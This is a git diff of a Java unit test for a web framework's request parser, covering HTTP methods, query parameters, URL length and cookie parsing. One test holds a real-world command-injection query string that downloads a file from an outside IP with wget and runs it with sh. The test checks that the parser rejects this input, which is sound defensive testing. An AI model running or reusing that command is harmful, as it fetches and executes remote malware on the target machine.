@@ -5,10 +5,12 @@ import core.framework.util.Strings;
 import core.framework.web.exception.BadRequestException;
 import core.framework.web.exception.MethodNotAllowedException;
 import io.undertow.server.HttpServerExchange;
+import io.undertow.server.ServerConnection;
 import io.undertow.server.handlers.CookieImpl;
 import io.undertow.util.Headers;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
+import org.xnio.OptionMap;
 
 import java.util.ArrayDeque;
 import java.util.Deque;
@@ -20,6 +22,8 @@ import static java.nio.charset.StandardCharsets.UTF_8;
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
 import static org.assertj.core.api.Assertions.entry;
+import static org.mockito.Mockito.mock;
+import static org.mockito.Mockito.when;
 
 /**
  * @author neo
@@ -55,8 +59,8 @@ class RequestParserTest {
     @Test
     void httpMethod() {
         assertThatThrownBy(() -> parser.httpMethod("TRACK"))
-                .isInstanceOf(MethodNotAllowedException.class)
-                .hasMessageContaining("method=TRACK");
+            .isInstanceOf(MethodNotAllowedException.class)
+            .hasMessageContaining("method=TRACK");
     }
 
     @Test
@@ -64,7 +68,7 @@ class RequestParserTest {
         var request = new RequestImpl(null, null);
         // undertow url decoding is disabled in core.framework.impl.web.HTTPServer.start, so the parser must decode all query param
         Map<String, Deque<String>> params = Map.of("key", new ArrayDeque<>(List.of(encode("value1 value2", UTF_8))),
-                "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
+            "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
         parser.parseQueryParams(request, params);
 
         assertThat(request.queryParams()).containsOnly(entry("key", "value1 value2"), entry("emptyKey", ""));
@@ -77,8 +81,8 @@ class RequestParserTest {
         // the query string is from actual cases of production
         Map<String, Deque<String>> params = Map.of("cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo", new ArrayDeque<>());
         assertThatThrownBy(() -> parser.parseQueryParams(request, params))
-                .isInstanceOf(BadRequestException.class)
-                .hasMessageContaining("failed to parse query param");
+            .isInstanceOf(BadRequestException.class)
+            .hasMessageContaining("failed to parse query param");
     }
 
     @Test
@@ -122,19 +126,30 @@ class RequestParserTest {
         request.scheme = "http";
         request.port = 80;
         assertThatThrownBy(() -> parser.requestURL(request, exchange))
-                .isInstanceOf(BadRequestException.class)
-                .hasMessageContaining("requestURL is too long");
+            .isInstanceOf(BadRequestException.class)
+            .hasMessageContaining("requestURL is too long");
     }
 
     @Test
     void parseCookies() {
-        Map<String, String> cookies = parser.parseCookies(Map.of("name", new CookieImpl("name", "value")));
+        Map<String, String> cookies = parser.decodeCookies(Map.of("name", new CookieImpl("name", "value")));
         assertThat(cookies).containsEntry("name", "value");
     }
 
     @Test
-    void parseCookiesWithInvalidValue() {
-        Map<String, String> cookies = parser.parseCookies(Map.of("name", new CookieImpl("name", "%%")));
+    void parseInvalidCookie() {
+        ServerConnection connection = mock(ServerConnection.class);
+        when(connection.getUndertowOptions()).thenReturn(OptionMap.EMPTY);
+        var exchange = new HttpServerExchange(connection, -1);
+        exchange.getRequestHeaders().put(Headers.COOKIE, "name=invalid-" + (char) 232);
+
+        assertThatThrownBy(() -> parser.parseCookies(new RequestImpl(null, null), exchange))
+            .isInstanceOf(BadRequestException.class);
+    }
+
+    @Test
+    void decodeInvalidCookieValue() {
+        Map<String, String> cookies = parser.decodeCookies(Map.of("name", new CookieImpl("name", "%%")));
         assertThat(cookies).isEmpty();
     }
 }
